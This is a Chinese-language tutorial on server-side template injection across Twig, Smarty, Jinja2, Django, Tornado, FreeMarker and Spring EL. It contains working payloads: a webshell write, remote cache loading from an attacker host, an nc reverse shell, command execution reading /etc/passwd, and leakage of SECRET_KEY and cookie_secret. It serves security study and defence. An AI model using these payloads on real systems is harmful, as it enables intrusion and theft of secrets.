## **0X00 前言：**

本文是学习K0rz3n大佬的文章，漏洞没有特定的介绍顺序，写作的目的主要是希望能将整个漏洞的框架完整的搭建起来（框架也就是所谓的前因后果->纵向，类比迁移->横向，探寻方法->技巧），而不是对漏洞的某一方面的简单陈述，我认为在没有完整的漏洞框架的基础上去单纯地学习怎么利用这种漏洞是没有意义的。

## **0X01 什么是注入：**

看之前先记住一句话：**注入就是格式化字符串漏洞的一种体现**

我们都知道，在01 的世界里，很多的漏洞都能归结为格式化字符串漏洞（不管是二进制还是web），二进制中我们能通过格式化字符串漏洞覆盖返回地址等，web中 SQL 注入就是一个非常好的例子，我们在开发者本来认为我们应该插入正常数据的地方插入了sql语句，这就破坏了原本的SQL 语句的格式，从而执行了与原句完全不同含义的SQL 语句达到了攻击者的目的，同理 XSS 在有些情况下的闭合标签的手法也是利用了格式化字符串这种思想，总之，凡是出现注入的地方就有着格式化字符串的影子。

## **0X02 什么是模板注入：**

SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，如今的开发已经形成了非常成熟的 MVC 的模式，我们的输入通过 V 接收，交给 C ，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做模板的技术，**这种模板请不要认为只存在于 Python 中**，感觉网上讲述的都是Python 的 SSTI ,在这之前也给了我非常大的误导(只能说自己没有好好研究，浅尝辄止)**，请记住，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是**，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。

## **0X03 常见的模板引擎**

### **1.php 常用的**

**Smarty**

Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛

**Twig**

Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。

**Blade**

Blade 是 Laravel 提供的一个既简单又强大的模板引擎。

和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。

### **2.Java 常用的**

**JSP**

这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典

**FreeMarker**

FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

**Velocity**

Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。

### **3.Python 常用的**

**Jinja2**

flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎

**django**

django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了

**tornado**

tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发

### **4.注意：**

同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如

tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号

{{}} 

中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些（**当然方便永远和安全是敌人**）

## **0X04 SSTI 怎么产生的**

服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.

**补充：**

单纯的字符串拼接并不能带来注入问题，关键要看你拼接的是什么，如果是控制语句，就会造成数据域与代码域的混淆，这样就会出洞

**当然，这种情况一般不属于模板引擎的问题，大多数原因都是开发者并没有很好的处理，比如下面的php 代码**

### **1.PHP 实例**

**示例PHP代码1：**

```php
<?php
  require_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;
Twig_Autoloader::register(true);
$twig = new Twig_Environment(new Twig_Loader_String());
$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
echo $output;
```

这段代码明显没有什么问题，用户的输入到时候渲染的时候就是 name 的值，由于name 外面已经有

{{}} 

了，也就是说，到时候显示的只是name 变量的值，就算你输入了 

{{xxx}}  

输出也只是

{{xxx}} 

而不会将xxx 作为模板变量解析

但是有些代码就是不这么写，比如下面这段代码

**示例PHP代码2：**

```php
<?php require_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘; 
Twig_Autoloader::register(true); 
$twig = new Twig_Environment(new Twig_Loader_String()); 
$output = $twig->render("Hello {$_GET[‘name‘]}");  // 将用户输入作为模版内容的一部分 echo $output; 
```

你看，现在开发者将用户的输入直接放在要渲染的字符串中了

**注意：不要把这里的

{} 

当成是模板变量外面的括号，这里的括号实际上只是为了区分变量和字符串常量而已**，于是我们输入 

{{xxx}} 

就非常的符合模板的规则，模板引擎一高兴就给解析了，然后服务器就凉了。

**这里演示的是PHP 的代码，使用的是 Twig 模板引擎，下面我们看一下 python 的 jinja2**

### **2.Python 实例**

#### **实例一：**

**示例Python代码1：**

```python
@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% extends "layout.html" %%}
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>//在这里
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template), 404
```

这是一段经典的 flask 源码，@app.errorhandler(404) 这一部分是装饰器，用于检测404用的，和最后的 ,404呼应的，这与我们这次的测试无关

我们看到，这里本身开发者并没有打算用到什么模板语法，就是使用了一个字符串的格式化来传递一个 url ，但是你别忘了你还是用模板的方式去渲染的啊，也就是说还是支持模板引擎支持的语法，那我们为什么不能输入模板引擎的语法呢？**（永远不要相信用户的输入）**

于是我们就能在URL后面跟上

{{ 7+7 }} 

自然而然就能计算出 49 了

#### **实例二：**

**示例Python代码2：**

```python
# coding: utf-8 
import sys from jinja2 
import Template 
template = Template("Your input: {}".format(sys.argv[1] if len(sys.argv) > 1 else '<empty>')) 
print template.render() 
```

和上面一样，还是格式化字符串，读者可以自己思考并尝试

**说了 Python 和 PHP 当然不能少了最重要的 JAVA**

### **3.JAVA 实例：**

#### **实例一：**

漏洞分析：https://paper.seebug.org/70/

这个漏洞相对于前面的就显得很神奇了，我下面简单的说一下，想看详细的可以看上面的链接：

**漏洞浅析：**

我们访问这个URL 的时候会报错并在页面上输出 uf9n1x

http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=uf9n1x

为什么会报错呢？因为uf9n1x并不符合 redirect_uri 的格式规范

但当我们请求下面这个URL 的时候

http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${2334-1} 

同样会报错，但是非常奇怪的是，我们的 

${} 

表达式居然被执行了，输出了 2333，模板注入实锤了，我们来看一下代码，分析一下

路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\WhitelabelErrorEndpoint.java

**WhitelabelErrorEndpoint.java**

```java
@FrameworkEndpoint
    public class WhitelabelErrorEndpoint {

        private static final String ERROR = "<html><body><h1>OAuth Error</h1><p>${errorSummary}</p></body></html>"; //这里是我们的字符串模板

        @RequestMapping("/oauth/error")
        public ModelAndView handleError(HttpServletRequest request) {
            Map<String, Object> model = new HashMap<String, Object>();
            Object error = request.getAttribute("error");
            // The error summary may contain malicious user input,
            // it needs to be escaped to prevent XSS
            String errorSummary;
            if (error instanceof OAuth2Exception) {
                OAuth2Exception oauthError = (OAuth2Exception) error;
                errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());
            }
            else {
                errorSummary = "Unknown error";
            }
            model.put("errorSummary", errorSummary);
            return new ModelAndView(new SpelView(ERROR), model);//通过模板渲染
        }
    }
```

我们看到，当拿到错误信息以后，就交给了 SpelView(),我们跟进去看一下

路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\SpelView.java

```java
class SpelView implements View {

    ...

    public SpelView(String template) {
        this.template = template;
        this.context.addPropertyAccessor(new MapAccessor());
        this.helper = new PropertyPlaceholderHelper("${", "}");
        this.resolver = new PlaceholderResolver() {
            public String resolvePlaceholder(String name) {//这里相当于是去一层${}
                Expression expression = parser.parseExpression(name);
                Object value = expression.getValue(context);
                return value == null ? null : value.toString();
            }
        };
    }

    ...

    public void render(Map<String, ?> model, HttpServletRequest request, HttpServletResponse response)
            throws Exception {
        ...
        String result = helper.replacePlaceholders(template, resolver);//replacePlaceholders是一个递归调用，能将第二个参数的${} 中的值取出来，不管有多少层括号
        ...
    }
}
```

resolver 这个参数是经过递归的去

${} 

处理的，不信我们看一下 replacePlaceholders()

```java
public String replacePlaceholders(String value, final Properties properties) {
    Assert.notNull(properties, "'properties' must not be null");
    return replacePlaceholders(value, new PlaceholderResolver() {
        @Override
        public String resolvePlaceholder(String placeholderName) {
            return properties.getProperty(placeholderName);
        }
    });
}
```

很明显这里面递归调用了replacePlaceholders() 函数，最终能得到单纯的表达式，然后渲染的时候放在 

${} 

就执行了。

#### **实例二：**

在2015年的blackhat 大会上曾讲述了Alfresco 的一个 SSTI 漏洞，不过很遗憾我没有找到源码，没能亲自分析，只能拿来payload 分析一下。

**实例代码：**

<#assign ex="freemarker.template.utility.Execute"?new()>  ${ ex("id") } 

**结果：**

uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)  

**解释：**
https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new
经过我查阅上述freemarker 的文档，这里面的 ?new() 是其高级内置函数

**用法如下：**

```java
<＃ - 创建一个用户定义的指令，调用类的参数构造函数 - > 
<#assign word_wrapp =“com.acmee.freemarker.WordWrapperDirective”？new（）>
<＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - >
<#assign word_wrapp_narrow =“com.acmee.freemarker.WordWrapperDirective”？new（40）> 
```

相当于是，调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Excute

## **0X05 检测方法**

同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。

简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。

**示意图如下：**

[![img](assets/1667436022979-ff0e95a2-a929-4a19-8a6a-6c153fecccd2.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSTI浅析-检测原理.png)

**注意：**有的时候出现 XSS 的时候，也有可能是 SSTI 漏洞，虽说模板引擎在大多数情况下都是使用的xss 过滤的，但是也不排除有些意外情况的出现，比如
有的模板引擎(比如 jinja2)在渲染的时候默认只针对特定的文件后缀名的文件(html,xhtml等)进行XSS过滤

这里提供一个大牛写的 SSTI 的检测工具 https://github.com/epinna/tplmap

## **0X06 攻击思路**

### **1.攻击方向：**

找到模板注入主要从三个方向进行攻击

(1)模板本身
(2)框架本身
(3)语言本身
(4)应用本身

### **2.攻击方法：**

我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个

**注意：**

在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制

#### **1.利用模板本身的特性进行攻击**

##### **1.Smarty**

Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)

但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法

比如：[getStreamVariable()](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385)

github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件）

**payload:**

{self::getStreamVariable("file:///proc/self/loginuid")} 

再比如：[class Smarty_Internal_Write_File](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16)

有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法

**函数原型：**

public function writeFile($_filepath, $_contents, Smarty $smarty) 

但是这个第三个参数是一个 Smarty 类型，后来找到了 self::clearConfig()

**函数原型：**

public function clearConfig($varname = null) {     return Smarty_Internal_Extension_Config::clearConfig($this, $varname); } 

能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell

**payload：**

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())} 

##### **2.Twig**

相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 self:: 调用静态变量了，但是 通过[官方文档](https://twig.symfony.com/doc/2.x/templates.html)的查询

**如下图所示：**

[![img](assets/1667436023576-95e1b7a3-c293-4cef-a23c-bdc9b140f6bd.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png)此处输入图片的描述

Twig 给我们提供了一个 _self, 虽然 _self 本身没有什么有用的方法，但是却有一个 env

**如下图所示：**

[![img](assets/1667436023551-019f2c03-4e5c-4da9-90b4-56628b5d3062.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png)

env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php

**如下图所示：**

[![img](assets/1667436023749-938ea84f-5b3b-4457-b4fd-4021ed00f42a.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png)

因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：

**payload:**

{{_self.env.setCache("ftp://attacker.net:2121")}} {{_self.env.loadTemplate("backdoor")}} 

**但是新的问题出现了**，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 [getFilter()](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874)

这个函数中调用了一个 call_user_function 方法

```java
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {//注意这行
            return $filter;
        }
    }
    return false;
}

public function registerUndefinedFilterCallback($callable)
{
    $this->filterCallbacks[] = $callable;
} 
```

我们只要把exec() 作为回调函数传进去就能实现命令执行了

**payload:**

```java
{{_self.env.registerUndefinedFilterCallback("exec")}} {{_self.env.getFilter("id")}} 
```

##### **3.freeMarker**

这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源

**payload:**

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") } 

#### **2.利用框架本身的特性进行攻击**

因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节

##### **1.Django**

```java
def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user)) 
```

注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，我么怎么办？

可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？

p牛在自己的博客中分享了这个思路，我把它引用过来：

Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项

什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标

后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：

**如下图：**

[![img](assets/1667436023020-261ec5e9-e04f-45db-a0a1-8b0ce7b14747.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png)此处输入图片的描述

所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

**payload:**

http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY} http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} 

##### **2.Flask/Jinja2**

config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。

**如图所示：**

[![img](assets/1667436024508-80fff23c-c85b-4c22-9f30-6d9cc39ed3f1.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png)这里我们利用 from_pyfile 和 from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了）

**源码：**

```python
def from_pyfile(self, filename, silent=False):

    filename = os.path.join(self.root_path, filename)
    d = types.ModuleType('config')
    d.__file__ = filename
    try:
        with open(filename) as config_file:
            exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
    except IOError as e:
        if silent and e.errno in (errno.ENOENT, errno.EISDIR):
            return False
        e.strerror = 'Unable to load configuration file (%s)' % e.strerror
        raise
    self.from_object(d)
    return True


def from_object(self, obj):

    if isinstance(obj, string_types):
        obj = import_string(obj)
    for key in dir(obj):
        if key.isupper():
            self[key] = getattr(obj, key)
```

**简单的解释一下这个方法：**

这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 d.__dict__翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，

**如图所示：**

[![img](assets/1667436024882-e4c086e0-8a18-4d86-b0c8-42553c3ba9f5.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python exec.png)我们简单的模拟一下看一下效果

**如图所示:**

[![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/SSTI/SSTI.assets/1667436025381-212bced1-e97e-4b2f-bb5a-e6c485ad5691.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png)此处输入图片的描述
[![img](assets/1667436025429-00f8ae30-514d-42bf-83e2-5ad526723f9b.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png)此处输入图片的描述

执行的代码片段被放入了 d.__dict__ 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码

```python
for key in dir(obj):
           if key.isupper():
               self[key] = getattr(obj, key)
```

这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件

from os import system SHELL = system 

到时候我们就能通过 config[‘SHELL’] 调用 system 方法了

那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文[python 沙盒逃逸备忘](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)

**最终的 payload:**

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}
//写文件
{{ config.from_pyfile('/tmp/evil') }}
//加载system
{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
//执行命令反弹SHELL
```

##### **3.Tornado**

写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明

根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西

"%'()*-/=[\]_| 

甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。

我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret

**如下图：**

[![img](assets/1667436025746-27688f86-f92a-4dfe-a740-8ab2f640b38b.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png)此处输入图片的描述

你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看[官方文档](http://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax)，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )

**如下图所示：**

[![img](assets/1667436026350-fb6aee82-781e-400c-964e-99bb7793de40.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png)此处输入图片的描述

这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看[官方文档](https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler)

**如下图所示：**

[![img](assets/1667436026127-20958463-63aa-45bb-8493-fbfee1a1ad44.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png)此处输入图片的描述

很清楚，我么看到 RequestHandler.settings 是 self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。

**payload:**

http://117.78.26.79:31093/error?msg={{handler.settings}} 

#### **2.利用模语言本身的特性进行攻击**

##### **1.Python**

Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的[一篇博文](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)中

##### **2.JAVA**

java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类

**如下图所示：**

[![img](assets/1667436026494-e107230b-a61a-41f8-8576-46d64c16b7c3.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png)此处输入图片的描述

有了这个基础我们就能想到这样的payload

**payload：**

${T(java.lang.System).getenv()} ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} 

当然要是文件操作就要用另外的类了,思路是不变的

**payload：**

```python
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} 
```

**注意:**

这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)

## **0X07 防御方法**

(1)和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制
(2)减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法